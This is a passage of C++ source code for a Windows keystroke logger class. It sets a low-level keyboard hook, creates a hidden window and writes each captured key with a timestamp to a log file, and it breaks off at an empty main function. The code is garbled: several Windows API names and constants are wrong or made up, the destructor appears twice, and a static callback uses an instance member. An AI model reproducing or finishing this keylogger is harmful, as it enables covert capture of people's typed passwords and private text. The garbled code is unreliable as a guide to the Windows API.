    HHOOK m_hook;
    HWND m_window;

public:
    KeystrokeLogger(const char* filename) {
        // Initialize the file
        m_logFile = fopen(filename, "a+");
        if (!m_logFile) {
            // Handle file creation error
            return;
        }

        // Set up the hook
        m_hook = SetWindowsHook(WH_KEYBOARD_LL, KeystrokeCallback);
        m_window = CreateWindow(None, NULL, WS_HIDE, 0, 0, 0, 0, HWND_DESKTOP, NULL, NULL, (void*)this, WS_OVERLAPPED | WS_VISIBLE, 0, 0);
    }

    ~KeystrokeLogger() {
        // Remove the hook
        if (m_hook) {
            UnhookKeyboard(m_hook);
            m_hook = 0;
        }
        // Close the file
        if (m_logFile) {
            fclose(m_logFile);
            m_logFile = NULL;
        }
    }

    static LRESULT CALLBACK KeystrokeCallback(int code, WPARAM wParam, LPARAM lParam) {
        if (code == HC_KEY) {
            // Check if it's a key press or release
            if (wParam == 0x01005) { // Key down
                // Capture the keystroke
                BYTE modifiers = GetKeyState(0x010001);
                BYTE key = MAKERKEY(wParam, GetKeyboardLayout(GetKeyboardLayoutList[GetDefaultInputLanguage()]);
                // Convert key to char if needed
                if (modifiers & 0x20) { // Shift is pressed
                    // Handle shifted characters
                }
                // Append to log file
                fprintf(m_logFile, "[%s] %c %d\n", GetCurrentTime(), key, GetTickCount());
            } else if (wParam == 0x010006) { // Key up
                // Handle key release
            }
        }
        return 0;
    }

    ~KeystrokeLogger() {
        // Already handled in destructor
    }
};

int main() {
